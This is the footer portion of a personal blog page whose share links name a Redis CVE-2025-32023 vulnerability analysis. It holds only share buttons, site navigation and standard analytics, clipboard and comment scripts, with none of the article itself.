  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&title=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&name=CVE-2025-32023 Redis  漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/CVE-2025-32023%20Redis%20%20HHL%20%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html&t=CVE-2025-32023 Redis  漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
